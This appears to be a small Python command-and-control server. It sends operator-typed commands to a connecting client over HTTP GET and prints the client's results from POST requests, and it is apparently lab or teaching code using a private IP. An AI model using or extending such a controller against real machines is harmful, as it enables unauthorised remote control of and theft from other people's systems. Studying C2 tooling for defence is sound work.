import http.server

HOST_NAME = "192.168.15.16"  # Server IP
PORT_NUMBER = 5000  # Server Port

class HTTPHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        # Ask for C2 command to send to the client
        c2_command = input('[Server] Enter command to send to the client: ')
        # Send response headers
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        # Send the command to the client
        self.wfile.write(c2_command.encode())
        print(f'[Server] Command sent: {c2_command}')
    
    def do_POST(self):
        # Receive and display the client's POST response
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)
        print(f'[Client Response] {post_data.decode()}')

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), HTTPHandler)
    print(f'[Server] Starting server at {HOST_NAME}:{PORT_NUMBER}')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n[Server] Server terminated.')
        httpd.server_close()
